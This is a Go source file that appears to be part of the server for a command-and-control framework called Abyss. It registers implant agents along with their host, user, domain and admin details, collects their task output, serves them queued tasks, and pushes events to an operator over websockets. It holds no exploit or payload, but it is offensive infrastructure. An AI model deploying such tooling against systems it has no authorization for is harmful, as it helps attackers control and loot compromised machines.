package httptransport

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"

	"github.com/z3vxo/Abyss/server/internal/parser"
)

type NewAgentWsBody struct {
	AgentId   int32  `json:"agent_id"`
	AgentName string `json:"agent_name"`
	Username  string `json:"username"`
	Hostname  string `json:"hostname"`
	Domain    string `json:"domain"`
	IsAdmin   string `json:"is_admin"`
}

type WebsockMsg struct {
	Event string          `json:"event"`
	Body  json.RawMessage `json:"body"`
}

func (srv *AgentServerInfo) HandleRegister(r *bytes.Reader) error {

	clientInfo, err := parser.ParseRegister(r)
	if err != nil {
		fmt.Println("failed Parsing")
		return err
	}

	if err := srv.DB.InsertAgent(&clientInfo); err != nil {
		fmt.Println("failed inserting to dv")

		return err
	}

	var isElev string
	if clientInfo.IsAdmin == 1 {
		isElev = "TRUE"
	} else {
		isElev = "FALSE"
	}

	body := NewAgentWsBody{
		AgentId:   clientInfo.AgentId,
		AgentName: clientInfo.AgentName,
		Username:  clientInfo.Username,
		Hostname:  clientInfo.Hostname,
		Domain:    clientInfo.Domain,
		IsAdmin:   isElev,
	}

	bodyJSON, _ := json.Marshal(body)

	msg := &WebsockMsg{
		Event: "new-agent",
		Body:  bodyJSON,
	}

	if err := srv.WS.Broadcast(msg); err != nil {
		fmt.Println(err)

		return err
	}

	return nil
}

type OutputEntry struct {
	TaskId int32  `json:"task_id"`
	Data   string `json:"output"`
}

type AgentOutputBody struct {
	AgentId   int32         `json:"agent_id"`
	TotalSize int32         `json:"total_size"`
	Output    []OutputEntry `json:"output"`
}

func (srv *AgentServerInfo) HandleOutput(r *bytes.Reader, size int32) error {
	outputData, err := parser.ParseOutput(r)
	if err != nil {
		fmt.Println(err)
		return err
	}

	out := make([]OutputEntry, 0, len(outputData.Data))
	for _, entry := range outputData.Data {
		if err := srv.DB.CompleteTask(entry.TaskId, entry.OutputData); err != nil {
			fmt.Println(err)
			return err
		}
		out = append(out, OutputEntry{
			TaskId: entry.TaskId,
			Data:   entry.OutputData,
		})
	}

	bodyJSON, err := json.Marshal(AgentOutputBody{
		AgentId:   outputData.AgentId,
		TotalSize: size,
		Output:    out,
	})
	if err != nil {
		return err
	}

	msg := &WebsockMsg{
		Event: "task-output",
		Body:  bodyJSON,
	}

	if err := srv.WS.Broadcast(msg); err != nil {
		fmt.Println(err)
		return err
	}

	return nil
}

func (srv *AgentServerInfo) HandleGetTasks(r *bytes.Reader) ([]byte, error) {
	var agentID int32
	if err := binary.Read(r, binary.LittleEndian, &agentID); err != nil {
		fmt.Println("Failed reading agentID")
		return nil, err
	}

	tasks, err := srv.DB.GetTasks(agentID)
	if err != nil {
		return nil, err
	}

	if err = srv.DB.UpdateAgentSeen(agentID); err != nil {
		return nil, err
	}

	return parser.PackageTasks(tasks)
}
